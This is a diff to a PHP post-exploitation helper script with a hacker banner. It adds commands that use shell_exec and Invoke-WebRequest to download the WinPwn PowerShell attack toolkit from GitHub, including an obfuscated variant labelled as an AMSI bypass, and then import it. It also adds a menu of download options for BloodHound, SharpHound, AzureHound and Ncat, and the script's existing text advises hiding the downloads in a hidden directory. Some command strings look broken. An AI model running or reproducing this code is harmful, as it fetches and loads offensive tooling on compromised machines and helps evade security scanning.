@@ -11,7 +11,7 @@ function banner()
     echo("\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m\n");
     echo("\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m\n");
     echo("\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m\n");
-    echo("gr33tz: Notroot Johnny5\nH4ppy h4ck1ng\n\n\n");
+    echo("gr33tz: Notroot && Johnny5\nH4ppy h4ck1ng\n\n\n");
 
 }
 
@@ -232,6 +232,8 @@ function checkSystem()
         windows("azh", "dl");
         windows("bhe", "dl");
         windows("ncW", "dl");
+		windows("wpwn", "dl");
+		windows("wpwns", "dl");
         return $os;
     } else {
         array_push($os, "Linux");
@@ -326,6 +328,13 @@ function windows($com, $r)
         $cdir = dirname("." . "\\" . PHP_EOL);
         if ($r == "dl") {
             echo("\nThis is quite noisy, you should make a hidden directory in order to hide these..\n");
+			echo("CMD's available....\n");
+			echo("bhe to download BloodHound exe\n");
+			echo("bh to download SharpHound\n");
+			echo("azh to download AzureHound\n");
+			echo("ncW to download Ncat exe\n");
+			echo("wpwn to download WinPWN\n");
+			echo("wpwns to download WinPWN Secure bypass AMSI\n");
             switch (strtolower($com)) {
                 case "bh":
                     echo("Pulling SharpHound..\n");
@@ -354,6 +363,18 @@ function windows($com, $r)
                     } else {
                         echo("Could not expand file.\n");
                     }
+					break;
+				case "wpwn":
+					echo("Pulling down WinPWN.\n");
+					shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1 -OutFile wpwn.ps1");
+                    echo("\nFile downloaded to: " . $cdir . " wpwn.ps1");
+					shell_exec("Import Module .\wpwn.ps1");
+                    break;
+				case "wpwns":
+					echo("Pulling down WinPWN ObSecure.\n");
+					shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1 -OutFile wpwns.ps1");
+                    echo("\nFile downloaded to: " . $cdir . " wpwns.ps1");
+					shell_exec("Import Module .\wpwns.ps1");
                     break;
             }
         } else {
